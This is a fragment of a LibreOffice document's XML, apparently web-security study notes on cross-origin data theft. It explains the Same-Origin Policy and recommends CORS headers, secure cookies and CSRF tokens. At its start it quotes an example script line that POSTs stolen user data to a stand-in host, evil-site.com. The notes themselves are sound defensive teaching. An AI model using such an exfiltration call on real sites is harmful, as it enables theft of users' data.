      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:s text:c="6"/>// Steal user data</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:s text:c="6"/>fetch("https://evil-site.com/steal", {</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:s text:c="8"/>method: "POST",</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:s text:c="8"/>body: JSON.stringify({ data })</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text"><text:s text:c="6"/>});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&lt;/script&gt;</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="Source_20_Text">&lt;/body&gt;</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text">&lt;/html&gt;</text:span></text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">❌ What Prevents This?</text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis">The browser blocks this request</text:span> because:</text:p>
      <text:list xml:id="list1648200748" text:style-name="L5">
        <text:list-item>
          <text:p text:style-name="P30"><text:span text:style-name="Source_20_Text">bank.com</text:span> does <text:span text:style-name="Strong_20_Emphasis">not allow cross-origin requests</text:span> (no CORS headers).</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P30">Same-Origin Policy kicks in: it <text:span text:style-name="Strong_20_Emphasis">prevents JavaScript from reading</text:span> the response, even if the browser sends the request.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">✅ How To Prevent Cross-Origin Data Theft:</text:h>
      <text:list xml:id="list1125664950" text:style-name="L6">
        <text:list-item>
          <text:p text:style-name="P31"><text:span text:style-name="Strong_20_Emphasis">CORS Headers</text:span> — Set on the server:</text:p>
          <text:p text:style-name="P13"><text:span text:style-name="Source_20_Text">Access-Control-Allow-Origin: https://your-frontend.com</text:span></text:p>
          <text:p text:style-name="P14"><text:span text:style-name="Source_20_Text">Access-Control-Allow-Credentials: true</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P31"><text:span text:style-name="Strong_20_Emphasis">Set Secure Cookies</text:span>:</text:p>
          <text:p text:style-name="P13"><text:soft-page-break/><text:span text:style-name="Source_20_Text">res.cookie('session_id', value, {</text:span></text:p>
          <text:p text:style-name="P13"><text:span text:style-name="Source_20_Text"><text:s text:c="2"/>httpOnly: true,</text:span></text:p>
          <text:p text:style-name="P13"><text:span text:style-name="Source_20_Text"><text:s text:c="2"/>sameSite: 'Strict',</text:span></text:p>
          <text:p text:style-name="P13"><text:span text:style-name="Source_20_Text"><text:s text:c="2"/>secure: true</text:span></text:p>
          <text:p text:style-name="P14"><text:span text:style-name="Source_20_Text">});</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P31"><text:span text:style-name="Strong_20_Emphasis">Use CSRF Tokens</text:span> on sensitive actions (POST, PUT, DELETE).</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:p text:style-name="Text_20_body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4:17.386264233</meta:creation-date>
    <dc:date>2025-04-29T19:51:49.351099183</dc:date>
    <meta:editing-duration>PT1H3M59S</meta:editing-duration>
    <meta:editing-cycles>27</meta:editing-cycles>
    <meta:generator>LibreOffice/7.3.7.2$Linux_X86_64 LibreOffice_project/30$Build-2</meta:generator>
    <meta:document-statistic meta:table-count="1" meta:image-count="0" meta:object-count="0" meta:page-count="9" meta:paragraph-count="221" meta:word-count="934" meta:character-count="7620" meta:non-whitespace-character-count="6686"/>
  </office:meta>
</office:document-meta>
</file>